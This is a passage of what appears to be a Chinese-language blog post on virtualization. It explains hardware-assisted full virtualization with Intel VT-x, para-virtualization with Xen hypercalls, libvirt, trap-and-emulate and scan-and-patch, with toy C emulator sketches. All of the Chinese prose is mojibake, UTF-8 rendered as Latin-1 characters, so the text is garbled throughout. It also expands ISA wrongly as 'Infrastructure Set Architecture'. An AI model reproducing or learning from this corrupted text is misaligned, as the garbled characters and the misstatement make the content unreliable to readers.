ä¾¿éƒ½æ˜¯é‡‡ç”¨äº†äºŒè¿›åˆ¶ä»£ç ç¿»è¯‘çš„æ”¯æŒå®Œå…¨è™šæ‹ŸåŒ–çš„è™šæ‹Ÿæœºè½¯ä»¶ï¼Œä¸è¿‡æœ€åˆçš„ Qemu æ›´ç±»ä¼¼äºã€è§£é‡Šæ‰§è¡Œã€‘çš„æ¨¡å¼</p></blockquote><p>è™½ç„¶åœ¨ä¼˜å…ˆçº§å‹ç¼©ä¸äºŒè¿›åˆ¶ä»£ç ç¿»è¯‘æŠ€æœ¯çš„é…åˆä¸‹ x86 æ¶æ„æˆåŠŸåœ°å®ç°äº†å®Œå…¨è™šæ‹ŸåŒ–ï¼Œä½†æ˜¯è¿™ç§â€œæ‰“è¡¥ä¸â€çš„æ–¹å¼å¾ˆéš¾åœ¨æ¶æ„ä¸Šä¿è¯å®Œæ•´æ€§ï¼Œå› æ­¤ x86 å‚å•†æœ€ç»ˆåœ¨ç¡¬ä»¶ä¸ŠåŠ å…¥äº†å¯¹è™šæ‹ŸåŒ–çš„æ”¯æŒï¼Œä»ç¡¬ä»¶æ¶æ„å±‚é¢å®ç°äº†å®Œå…¨è™šæ‹ŸåŒ–</p><h4 id="2ï¼‰ã€Œç¡¬ä»¶è¾…åŠ©çš„å®Œå…¨è™šæ‹ŸåŒ–ã€"><a href="#2ï¼‰ã€Œç¡¬ä»¶è¾…åŠ©çš„å®Œå…¨è™šæ‹ŸåŒ–ã€" class="headerlink" title="2ï¼‰ã€Œç¡¬ä»¶è¾…åŠ©çš„å®Œå…¨è™šæ‹ŸåŒ–ã€"></a>2ï¼‰ã€Œç¡¬ä»¶è¾…åŠ©çš„å®Œå…¨è™šæ‹ŸåŒ–ã€</h4><p>åœ¨çº¯è½¯ä»¶è™šæ‹ŸåŒ–æŠ€æœ¯å‘å±•å¤šå¹´åï¼Œx86 æ¶æ„å¯¹è™šæ‹ŸåŒ–çš„æ”¯æŒç»ˆäºå§—å§—æ¥è¿Ÿï¼šIntel ä¸ AMD åˆ†åˆ«æ¨å‡ºäº†è‡ªå®¶çš„ç¡¬ä»¶è™šæ‹ŸåŒ–æŠ€æœ¯ Intel VT ä¸ AMD-vï¼Œåœ¨ç¡¬ä»¶å±‚é¢æ·»åŠ äº†å¯¹è™šæ‹ŸåŒ–çš„æ”¯æŒï¼Œä½¿å¾— x86 æ¶æ„ç»ˆäºæˆä¸ºä¸€ä¸ªç¬¦åˆ <code>Popek and Goldberg virtualization requirements</code>çš„ ISAï¼ˆInfrastructure Set Architectureï¼‰ï¼Œä»è€Œå¾—ä»¥å®ç°å®Œå…¨è™šæ‹ŸåŒ–</p><p>ç¡¬ä»¶è¾…åŠ©è™šæ‹ŸåŒ–æœ¬è´¨ä¸Šæ˜¯é€šè¿‡åœ¨ Guest OS ä¸ç¡¬ä»¶ä¸­é—´å†æ·»åŠ ä¸€ä¸ª VMM ä¸­é—´å±‚æ¥å®ç°çš„ï¼Œ<strong>ç”±ç¡¬ä»¶è´Ÿè´£æˆªè· OS å¯¹æ•æ„ŸæŒ‡ä»¤çš„æ‰§è¡Œä¸å¯¹æ•æ„Ÿèµ„æºçš„è®¿é—®ï¼Œå¹¶é€šè¿‡å¼‚å¸¸çš„æ–¹å¼æŠ¥å‘Šç»™ VMM</strong>ï¼Œä»è€Œä»ç¡¬ä»¶å±‚é¢å®ç°äº† <code>Popek and Goldberg virtualization requirements</code></p><p><img src="https://s2.loli.net/2022/08/05/1rfEzK89DG6Moml.png" alt="image.png"></p><p>ä»¥ <code>Intel VT-x</code> æŠ€æœ¯ä¸ºä¾‹ï¼Œå…¶åœ¨ç¡¬ä»¶æ¶æ„ä¸Šå°† CPU çš„è¿è¡Œæ¨¡å¼åˆ†ä¸ºä¸¤ç§ï¼š<strong>ã€ŒNon-Root Modeã€ä¸ã€ŒRoot Modeã€</strong>ï¼Œè¿™ä¸¤ä¸ªè¿è¡Œæ¨¡å¼éƒ½æœ‰ç€å„è‡ªçš„åˆ†çº§ä¿æŠ¤ç¯ï¼Œå…¶ä¸­ Host OS ä¸ VMM è¿è¡Œåœ¨ Root Mode ä¸‹è€Œ Guest OS åˆ™è¿è¡Œåœ¨ Non-Root Mode ä¸‹</p><p>Root Mode ä¸åŸæœ‰çš„è¿è¡Œæ¨¡å¼ä¸€èˆ¬æ— äºŒï¼Œåœ¨ Non-Root Modeä¸‹éæ•æ„ŸæŒ‡ä»¤å¯ä»¥ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œï¼Œå½“ Guest OS è¿è¡Œäº†æ•æ„ŸæŒ‡ä»¤æ—¶ï¼Œç¡¬ä»¶ä¾¿ä¼šæ•è·åˆ°è¿™ä¸€è¡Œä¸ºï¼Œåˆ‡æ¢åˆ° Root Mode å¹¶å°†ä¹‹æŠ¥å‘Šç»™ VMMï¼Œç”± VMM å¤„ç†å¥½åå†æ¢å¤åˆ° Non-Root Mode ä¸­ç»§ç»­ Guest OS çš„è¿è¡Œï¼Œ<strong>è¿™ä»ç¡¬ä»¶å±‚é¢å®ç°äº†ã€ŒTrap &amp; Emulateã€æ¨¡å‹</strong></p><p><img src="https://s2.loli.net/2022/08/05/n9TRrsCkKZvGE3U.png" alt="image.png"></p><h3 id="II-åŠè™šæ‹ŸåŒ–ï¼ˆPara-virtualizationï¼‰"><a href="#II-åŠè™šæ‹ŸåŒ–ï¼ˆPara-virtualizationï¼‰" class="headerlink" title="II.åŠè™šæ‹ŸåŒ–ï¼ˆPara-virtualizationï¼‰"></a>II.åŠè™šæ‹ŸåŒ–ï¼ˆPara-virtualizationï¼‰</h3><p>åŠè™šæ‹ŸåŒ–æŠ€æœ¯æœ€åˆçš„ç›®çš„ä¹Ÿæ˜¯ä¸ºäº†è§£å†³ x86 æ¶æ„æ— æ³•å®ç°ç»å…¸è™šæ‹ŸåŒ–æ¶æ„çš„é—®é¢˜ï¼Œå…¶<strong>é€šè¿‡ä¿®æ”¹æ“ä½œç³»ç»Ÿå†…æ ¸çš„ä»£ç ï¼Œä½¿å¾—æ“ä½œç³»ç»Ÿå†…æ ¸å®Œå…¨é¿å…è¿™äº›éš¾ä»¥è™šæ‹ŸåŒ–çš„æŒ‡ä»¤</strong>ï¼Œä»è€Œåœ¨ x86 æ¶æ„ä¸‹å®ç°è™šæ‹ŸåŒ–ã€‚åœ¨åŠè™šæ‹ŸåŒ–æŠ€æœ¯ä¸­ï¼ŒGuest OS èƒ½å¤Ÿæ„ŸçŸ¥åˆ°è‡ªå·±è¿è¡Œåœ¨è™šæ‹ŸåŒ–ç¯å¢ƒä¸­ï¼Œå½“æ¶‰åŠåˆ°æ•æ„ŸæŒ‡ä»¤çš„æ‰§è¡Œæˆ–æ˜¯å¯¹æ•æ„Ÿèµ„æºçš„è®¿é—®æ—¶ï¼ŒGuest OS é€šè¿‡åä¸º <code>Hypercall</code> çš„ API é™·å…¥ VMM ä¸­ï¼ˆé€šå¸¸é€šè¿‡é™·é˜±ç­‰æ–¹å¼å®ç°ï¼‰ï¼Œç”± VMM è¿›è¡Œç›¸åº”çš„æ“ä½œåå†é‡æ–°è¿”å› VM ä¸­çš„ Guest OS ç»§ç»­æ‰§è¡Œ</p><p><img src="https://s2.loli.net/2022/08/05/MhAJEnmCSBzoUVW.png" alt="image.png"></p><blockquote><p>Xen ä¾¿æ˜¯é‡‡ç”¨äº†è¿™ä¸€æ¨¡å¼çš„è™šæ‹ŸåŒ–è½¯ä»¶</p></blockquote><p>åŠè™šæ‹ŸåŒ–éœ€è¦å¯¹ OS kernel çš„ä»£ç è¿›è¡Œ<strong>å¤§é‡çš„ä¿®æ”¹</strong>ï¼Œä»è€Œä½¿å¾—å…¶æ”¯æŒåŠè™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œå› æ­¤ Windows è¿™æ ·çš„é—­æºæ“ä½œç³»ç»Ÿæœ€åˆæ˜¯ä¸æ”¯æŒåŠè™šæ‹ŸåŒ–çš„</p><h2 id="å››ã€libvirt"><a href="#å››ã€libvirt" class="headerlink" title="å››ã€libvirt"></a>å››ã€libvirt</h2><p>ä¼—æ‰€å‘¨çŸ¥ç³»ç»Ÿè™šæ‹ŸåŒ–å¹³å°ä¸æ­¢ä¸€ç§ï¼ˆVMWareã€Xenã€KVMã€â€¦ï¼‰ï¼Œç®¡ç†èµ·æ¥è¾ƒä¸ºéº»çƒ¦ï¼Œå› æ­¤ <strong>libvirt</strong> åº”è¿è€Œç”Ÿ</p><p><code>libvirt</code> æ˜¯ä¸€ä¸ª<strong>ä¸“é—¨ç”¨äºç®¡ç†è™šæ‹ŸåŒ–å¹³å°çš„å·¥å…·åŒ…</strong>ï¼Œå…¶æä¾›äº†ç”¨äºç®¡ç†ç¡¬ä»¶è™šæ‹ŸåŒ–çš„<strong>å¼€æºAPI</strong>ï¼ˆlibvirt APIï¼‰ã€<strong>å®ˆæŠ¤è¿›ç¨‹</strong>ï¼ˆlibvirtdï¼‰ä¸<strong>ç®¡ç†å·¥å…·</strong>ï¼ˆvirshï¼‰ï¼Œå¯ä»¥ç”¨äºç®¡ç†ç°åœ¨ä¸»æµçš„å¤§éƒ¨åˆ† VMMï¼š</p><p><img src="https://s2.loli.net/2022/08/08/tUSvuapWKl6dx9z.png" alt="image.png"></p><h1 id="0x03-CPU-è™šæ‹ŸåŒ–"><a href="#0x03-CPU-è™šæ‹ŸåŒ–" class="headerlink" title="0x03. CPU è™šæ‹ŸåŒ–"></a>0x03. CPU è™šæ‹ŸåŒ–</h1><p>CPU è™šæ‹ŸåŒ–æ˜¯ç³»ç»Ÿè™šæ‹ŸåŒ–æŠ€æœ¯ä¸­æœ€æ ¸å¿ƒçš„éƒ¨åˆ†ï¼Œå› ä¸º CPU æ˜¯è®¡ç®—æœºä¸­æœ€æ ¸å¿ƒçš„ç»„ä»¶ï¼Œç›´æ¥æ§åˆ¶ç€æ•´ä¸ªç³»ç»Ÿçš„è¿è¡Œï¼ŒåŒæ—¶å†…å­˜è®¿é—®ï¼ˆå†…å­˜è™šæ‹ŸåŒ–ï¼‰ä¸ I&#x2F;O æ“ä½œï¼ˆI&#x2F;Oè™šæ‹ŸåŒ–ï¼‰ä¹Ÿéƒ½ç›´æ¥ä¾èµ–äº CPUï¼Œå› æ­¤ CPU è™šæ‹ŸåŒ–æ˜¯ç³»ç»Ÿè™šæ‹ŸåŒ–æŠ€æœ¯ä¸­çš„æ ¸å¿ƒ</p><p>åœ¨ Gerald J. Popek ä¸ Robert P. Goldberg çš„åˆä½œè®ºæ–‡<a href="https://dl.acm.org/doi/pdf/10.1145/361011.361073">ã€ŠFormal Requirements for Virtualizable Third Generation Architecturesã€‹</a> ä¸­æå‡ºäº†æ»¡è¶³è™šæ‹ŸåŒ–ç³»ç»Ÿç»“æ„çš„ VMM çš„ä¸‰ä¸ªå……åˆ†æ¡ä»¶ï¼šç­‰ä»·æ€§ï¼Œèµ„æºæ§åˆ¶ï¼Œæ•ˆç‡æ€§ã€‚ä¸ºäº†æ»¡è¶³è¿™ä¸ªæ¡ä»¶ï¼Œ CPU è™šæ‹ŸåŒ–ä½¿ç”¨çš„ç»å…¸æ¨¡å‹æ˜¯ã€ŒTrap &amp; Emulateã€ï¼Œä½¿ç”¨<strong>ç‰¹æƒçº§å‹ç¼©</strong>ï¼ˆRing Compressionï¼‰çš„æ–¹å¼æ¥å®ç°è™šæ‹Ÿç¯å¢ƒï¼š</p><ul><li>Hypervisor è¿è¡Œåœ¨æœ€é«˜ç‰¹æƒçº§ä¸Šï¼ŒGuest VM è¿è¡Œåœ¨ä½ç‰¹æƒçº§ä¸Šï¼ŒGuest VM åœ¨ç¡¬ä»¶ä¸Šç›´æ¥æ‰§è¡Œéæ•æ„ŸæŒ‡ä»¤ï¼Œå½“ Guest VM æ‰§è¡Œåˆ°æ•æ„ŸæŒ‡ä»¤æ—¶ï¼Œå…¶ä¾¿ä¼šé™·å…¥ä½äºæœ€é«˜ç‰¹æƒçº§çš„ Hypervisor ï¼Œæ­¤æ—¶ä¾¿èƒ½ç”± Hypervisor æ¨¡æ‹Ÿæ•æ„ŸæŒ‡ä»¤çš„è¡Œä¸º</li><li>å½“å‘ç”Ÿ virtual CPU è°ƒåº¦æ—¶ï¼Œæˆ‘ä»¬å°† vCPU çš„çŠ¶æ€ä¿å­˜ï¼Œæ¢å¤ Hypervisor çŠ¶æ€ï¼ŒHypervisor å®Œæˆå…¶è¡Œä¸ºåè¿›è¡Œä¸‹ä¸€ virtual CPU çš„è°ƒåº¦ï¼Œæ¢å¤ä¸‹ä¸€ vCPU çš„çŠ¶æ€å¹¶æ¢å¤æ‰§è¡Œ</li></ul><p><img src="https://s2.loli.net/2022/08/11/SvO9ewNdxIbsLqV.png" alt="image.png"></p><h2 id="ä¸€ã€çº¯è½¯ä»¶å®ç°è™šæ‹ŸåŒ–"><a href="#ä¸€ã€çº¯è½¯ä»¶å®ç°è™šæ‹ŸåŒ–" class="headerlink" title="ä¸€ã€çº¯è½¯ä»¶å®ç°è™šæ‹ŸåŒ–"></a>ä¸€ã€çº¯è½¯ä»¶å®ç°è™šæ‹ŸåŒ–</h2><p>å‰æ–‡æˆ‘ä»¬å·²ç»æŒ‡å‡º x86 æ¶æ„å­˜åœ¨<strong>éç‰¹æƒæ•æ„ŸæŒ‡ä»¤ï¼Œç›´æ¥å¯¼è‡´ VMM æ— æ³•æˆªè· x86 VM çš„æ•æ„Ÿè¡Œä¸º</strong>ï¼Œè¿™è¿åäº†<code>Popek and Goldberg virtualization requirements</code>ï¼Œå› æ­¤åœ¨ç¡¬ä»¶å¯¹è™šæ‹ŸåŒ–çš„æ”¯æŒå‡ºç°ä¹‹å‰ï¼Œè™šæ‹ŸåŒ–å‚å•†åªå¥½å…ˆä»è½¯ä»¶å±‚é¢ä¸‹æ‰‹</p><h3 id="I-æ¨¡æ‹Ÿ-amp-è§£é‡Šæ‰§è¡Œ"><a href="#I-æ¨¡æ‹Ÿ-amp-è§£é‡Šæ‰§è¡Œ" class="headerlink" title="I. æ¨¡æ‹Ÿ &amp; è§£é‡Šæ‰§è¡Œ"></a>I. æ¨¡æ‹Ÿ &amp; è§£é‡Šæ‰§è¡Œ</h3><p><strong>ã€Œæ¨¡æ‹Ÿã€</strong>ï¼ˆEmulateï¼‰æŠ€æœ¯çš„å‡ºç°å…¶å®æ—©äºè™šæ‹ŸåŒ–ï¼Œçº¯è½¯ä»¶çš„æ¨¡æ‹Ÿæœ¬è´¨ä¸Šå°±æ˜¯é€šè¿‡ç¼–å†™èƒ½å¤Ÿå‘ˆç°å‡ºä¸è¢«æ¨¡æ‹Ÿå¯¹è±¡ç›¸åŒè¡Œä¸ºçš„åº”ç”¨ç¨‹å¼ä»è€Œè¾¾åˆ°è¿è¡ŒéåŒæ„å¹³å°åº”ç”¨ç¨‹åºçš„æ•ˆæœ</p><p>æ¨¡æ‹ŸæŠ€æœ¯ä¸ä»…èƒ½å¤Ÿåº”ç”¨äºç¨‹åºçº§åˆ«çš„æ¨¡æ‹Ÿï¼Œè¿˜èƒ½åº”ç”¨äºç³»ç»Ÿçº§åˆ«çš„æ¨¡æ‹Ÿï¼šCPU è¿è¡Œçš„æœ¬è´¨è¡Œä¸ºå…¶å®å°±æ˜¯<strong>ä» PC å¯„å­˜å™¨æ‰€æŒ‡å†…å­˜åŒºåŸŸä¸­ä¸æ–­å–å‡ºæŒ‡ä»¤è§£ç æ‰§è¡Œ</strong>ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œå®ç°ä¸€ä¸ªè™šæ‹Ÿæœºæœ€ç®€å•ç²—æš´çš„æ–¹æ³•ä¾¿æ˜¯é€šè¿‡<strong>æ¨¡æ‹Ÿæ¯ä¸€æ¡æŒ‡ä»¤å¯¹åº”çš„è¡Œä¸ºï¼Œä»è€Œä½¿å¾— VM çš„è¡Œä¸ºå¯¹ VMM è€Œè¨€æ˜¯å®Œå…¨å¯æ§çš„</strong></p><blockquote><p>ä¾‹å¦‚ï¼Œå¯¹äº <code>mov rax, rbx</code> è¿™æ ·çš„æŒ‡ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ç¨‹åºæ¥æ¨¡æ‹Ÿï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">x86_regs</span>&#123;</span><br>    <span class="hljs-type">uint64_t</span> rax;<br>    <span class="hljs-type">uint64_t</span> rbx;<br>    <span class="hljs-type">uint64_t</span> rcx;<br>    <span class="hljs-type">uint64_t</span> rdx;<br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">mov_regs</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> *to, <span class="hljs-type">uint64_t</span> *from)</span><br>&#123;<br>    *to = *from;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-keyword">inline</span> <span class="hljs-title function_">mov_rax_rbx</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> x86_regs *regs)</span><br>&#123;<br>    mov_regs(&amp;regs-&gt;rax, &amp;regs-&gt;rbx);<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>å®ç°æ¨¡æ‹ŸæŠ€æœ¯çš„åŸç†ä¹Ÿæ˜¯æœ€ç®€å•çš„â€”â€”æˆ‘ä»¬å¯ä»¥é€šè¿‡<strong>ã€Œè§£é‡Šæ‰§è¡Œã€</strong>çš„æ–¹å¼æ¥å®ç°æ¨¡æ‹ŸæŠ€æœ¯ï¼š</p><ul><li>æ¨¡æ‹Ÿå™¨ç¨‹åºä¸æ–­åœ°ä»å†…å­˜ä¸­è¯»å–æŒ‡ä»¤ï¼Œå¹¶æ¨¡æ‹Ÿå‡ºæ¯ä¸€æ¡æŒ‡ä»¤çš„æ•ˆæœï¼Œå‘¨è€Œå¤å§‹</li></ul><p>è¿™æ ·ï¼Œä»æŸç§ç¨‹åº¦è€Œè¨€ï¼Œ<strong>æ¯ä¸€æ¡æŒ‡ä»¤åœ¨æ‰§è¡Œæ—¶éƒ½å®Œæˆäº†â€œé™·å…¥â€</strong>ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æ¨¡æ‹ŸæŠ€æœ¯è§£å†³è™šæ‹ŸåŒ–çš„æ¼æ´ï¼ŒåŒæ—¶è¿˜èƒ½æ¨¡æ‹Ÿä¸ç‰©ç†æœºä¸åŒæ¶æ„çš„è™šæ‹Ÿæœº</p><p><img src="https://s2.loli.net/2022/08/12/ZCSrkJIfeihDRwF.png" alt="image.png"></p><p><strong>Qemu</strong>â€”â€”<code>Quick Emulator</code> æœ¬è´¨ä¸Šä¾¿æ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿå™¨ï¼Œå…¶<strong>å®Œæ•´åœ°æ¨¡æ‹Ÿäº†ä¸€å¥—åŒ…æ‹¬å„ç§å¤–è®¾åœ¨å†…çš„è®¡ç®—æœºç³»ç»Ÿ</strong></p><blockquote><p>ä¾‹å¦‚ä»¥ä¸‹ä¾¿æ˜¯ç¬”è€…å®ç°çš„ä¸€ä¸ªæœ€æœ€æœ€æœ€ç®€é™‹çš„æ¨¡æ‹Ÿå™¨æ¶æ„ï¼Œå®é™…çš„æ¶æ„ä¼šæ¯”è¿™å¤æ‚å¾—å¤šï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">CPU</span> &#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">regs</span> <span class="hljs-title">regs</span>;</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span>&#123;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cpu</span> *<span class="hljs-title">cpu</span>[];</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">memory</span> *<span class="hljs-title">mm</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bus</span> *<span class="hljs-title">bus</span>;</span><br>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">start_a_new_vm</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> disk *disk)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">VM</span> <span class="hljs-title">vm</span> =</span> new_vm(<span class="hljs-string">&quot;x86&quot;</span>, disk);<br>    <br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">instruction</span> <span class="hljs-title">insn</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exec_result</span> <span class="hljs-title">res</span>;</span><br>        <br>        fetch_next_insn(vm, &amp;insn);<br>        vm_exec_insn(vm, &amp;insn, &amp;res);<br><br>        <span class="hljs-keyword">switch</span> (res.type) &#123;<br>            <span class="hljs-keyword">case</span> EXIT_VM:<br>                vm_stop(vm);<br>                <span class="hljs-keyword">break</span>;<br>            <span class="hljs-keyword">case</span> RESOURCE_ACCESS:<br>                vm_access_resource(vm, &amp;res);<br>            <span class="hljs-keyword">default</span>:<br>                <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><p>ä¸è¿‡åŸºäºè§£é‡Šæ‰§è¡Œçš„æ¨¡æ‹ŸæŠ€æœ¯æœ‰ç€ä¸€ä¸ªéå¸¸è‡´å‘½çš„ç¼ºç‚¹â€”â€”<strong>æ€§èƒ½æå·®</strong>ï¼Œå› ä¸ºæ¯ä¸€æ¡æŒ‡ä»¤éƒ½éœ€è¦ç»è¿‡ VMM çš„è§£æåå†ç”± VMM æ¨¡æ‹Ÿæ‰§è¡Œï¼Œå“ªæ€•æœ€ç®€å•çš„ä¸€æ¡æŒ‡ä»¤ä¹Ÿå¯èƒ½éœ€è¦åˆ†è§£æˆå¤šä¸ªæ­¥éª¤ä¸å¤šæ¬¡å†…å­˜è®¿é—®ï¼Œæ•ˆç‡æä½</p><p>è®©æˆ‘ä»¬é‡æ–°å®¡è§†æˆ‘ä»¬ä¸ºä»€ä¹ˆéœ€è¦åœ¨ x86 æ¶æ„ä¸Šä½¿ç”¨æ¨¡æ‹ŸæŠ€æœ¯æ¥å®ç°è™šæ‹Ÿæœºï¼šéç‰¹æƒæ•æ„ŸæŒ‡ä»¤çš„å­˜åœ¨æ‰“ç ´äº† <code>Popek and Goldberg virtualization requirements</code>ï¼Œä½†<strong>éç‰¹æƒæ•æ„ŸæŒ‡ä»¤ä»…æ˜¯å°‘æ•°ï¼Œå¤§éƒ¨åˆ†æŒ‡ä»¤æˆ‘ä»¬ä»èƒ½ç›´æ¥åœ¨ç‰©ç†ç¡¬ä»¶ä¸Šè¿è¡Œ</strong>ï¼Œå› æ­¤åŸºäºæ¨¡æ‹ŸæŠ€æœ¯è¿›è¡Œæ”¹è¿›çš„è™šæ‹ŸåŒ–æŠ€æœ¯å‡ºç°äº†ï¼š<code>æ‰«æ &amp; ä¿®è¡¥</code> ä¸ <code>äºŒè¿›åˆ¶ç¿»è¯‘</code></p><h3 id="II-æ‰«æ-amp-ä¿®è¡¥"><a href="#II-æ‰«æ-amp-ä¿®è¡¥" class="headerlink" title="II. æ‰«æ &amp; ä¿®è¡¥"></a>II. æ‰«æ &amp; ä¿®è¡¥</h3><p>è™šæ‹ŸåŒ–åœºæ™¯ä¸‹çš„è™šæ‹Ÿæœºå¤§éƒ½æ˜¯ä¸ç‰©ç†æœºæœ‰ç€ç›¸åŒçš„ ISAï¼Œå› æ­¤æˆ‘ä»¬å¹¶æ²¡æœ‰å¿…è¦é‡‡ç”¨çº¯æ¨¡æ‹Ÿçš„æŠ€æœ¯å®ç°è™šæ‹Ÿæœºï¼Œè€Œæ˜¯å¯ä»¥<strong>è®©éæ•æ„ŸæŒ‡ä»¤ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œï¼Œé€šè¿‡æŸç§æ–¹å¼è®©éç‰¹æƒæ•æ„ŸæŒ‡ä»¤é™·å…¥ VMM</strong>ï¼Œä»è€Œé‡æ–°å®ç° Trap &amp; Emulate æ¨¡å‹</p><p><strong>ã€Œæ‰«æ &amp; ä¿®è¡¥ã€</strong>ä¾¿æ˜¯è¿™æ ·çš„ä¸€ç§æŠ€æœ¯ï¼Œå…¶<strong>è®©éæ•æ„ŸæŒ‡ä»¤ç›´æ¥åœ¨ç¡¬ä»¶ä¸Šæ‰§è¡Œ</strong>ï¼ŒåŒæ—¶<strong>å°†ç³»ç»Ÿä»£ç ä¸­çš„æ•æ„ŸæŒ‡ä»¤æ›¿æ¢ä¸ºè·³è½¬æŒ‡ä»¤ç­‰èƒ½é™·å…¥ VMM ä¸­çš„æŒ‡ä»¤</strong>ï¼Œä»è€Œè®© VM åœ¨æ‰§è¡Œæ•æ„ŸæŒ‡ä»¤æ—¶èƒ½é™·å…¥ VMMï¼Œä½¿å¾— VMM èƒ½å¤Ÿæ¨¡æ‹Ÿæ‰§è¡Œæ•æ„ŸæŒ‡ä»¤çš„æ•ˆæœ</p><p>ã€Œæ‰«æ &amp; ä¿®è¡¥ã€çš„åŸºæœ¬æ‰§è¡Œæµç¨‹å¦‚ä¸‹ï¼š</p><ul><li>VMM åœ¨ VM æ‰§è¡Œæ¯æ®µä»£ç ä¹‹å‰å¯¹å…¶è¿›è¡Œæ‰«æï¼Œè§£ææ¯ä¸€æ¡æŒ‡ä»¤ï¼ŒæŸ¥æ‰¾ç‰¹æƒä¸æ•æ„ŸæŒ‡ä»¤</li><li>VMM åŠ¨æ€ç”Ÿæˆç›¸åº”æŒ‡ä»¤çš„è¡¥ä¸ä»£ç ï¼Œå¹¶å°†åŸæ•æ„ŸæŒ‡ä»¤æ›¿æ¢ä¸ºä¸€ä¸ªå¤–è·³è½¬ä»¥é™·å…¥ VMMï¼Œä»è€Œåœ¨ VMM ä¸­æ‰§è¡ŒåŠ¨æ€ç”Ÿæˆçš„è¡¥ä¸ä»£ç </li><li>è¡¥ä¸ä»£ç æ‰§è¡Œç»“æŸåï¼Œå†è·³è½¬å› VM ä¸­ç»§ç»­æ‰§è¡Œä¸‹ä¸€æ¡ä»£ç </li></ul><p><img src="https://s2.loli.net/2022/08/12/3ZlrC9zkLpJIvGO.png" alt="image.png"></p><blockquote><p>ä¾‹å¦‚è¿™æ˜¯ VirtualBox ä¸­å¯¹ <code>cli</code> æŒ‡ä»¤è¿›è¡Œæ¨¡æ‹Ÿçš„ä»£ç ï¼š</p><p><img src="https://s2.loli.net/2022/08/12/IFMhNz16xSneOq4.png" alt="image.png"></p></blockquote><p>åœ¨ã€Œæ‰«æ &amp; ä¿®è¡¥ã€æŠ€æœ¯å½“ä¸­å¤§éƒ¨åˆ†çš„ä»£ç éƒ½å¯ä»¥ç›´æ¥åœ¨ç‰©ç† CPU ä¸Šè¿è¡Œï¼Œå…¶æ€§èƒ½æŸå¤±è¾ƒå°ï¼Œä½†ã€Œæ‰«æ &amp; ä¿®è¡¥ã€åŒæ ·å­˜åœ¨ç€ä¸€å®šçš„ç¼ºé™·ï¼š</p><ul><li><p>ç‰¹æƒæŒ‡ä»¤ä¸æ•æ„ŸæŒ‡ä»¤ä»é€šè¿‡æ¨¡æ‹Ÿæ‰§è¡Œçš„æ–¹å¼å®Œæˆï¼Œä»å¯èƒ½é€ æˆä¸€å®šçš„æ€§èƒ½æŸå¤±</p></li><li><p>ä»£ç è¡¥ä¸å½“ä¸­å¼•å…¥äº†é¢å¤–çš„è·³è½¬ï¼Œè¿™ç ´åäº†ä»£ç çš„å±€éƒ¨æ€§</p><blockquote><p>å±€éƒ¨æ€§åŸç†ï¼šCPUå­˜å–æŒ‡ä»¤&#x2F;æ•°æ®çš„å†…å­˜å•å…ƒåº”å½“è¶‹å‘äºèšé›†åœ¨ä¸€ä¸ªè¾ƒå°çš„åŒºåŸŸ</p></blockquote></li><li><p>VMM éœ€è¦ç»´æŠ¤ä¸€ä»½è¡¥ä¸ä»£ç å¯¹åº”çš„åŸå§‹ä»£ç çš„å‰¯æœ¬ï¼Œè¿™é€ æˆäº†é¢å¤–çš„å¼€é”€</p></li></ul><h3 id="III-äºŒè¿›åˆ¶ç¿»è¯‘"><a href="#III-äºŒè¿›åˆ¶ç¿»è¯‘" class="headerlink" title="III. 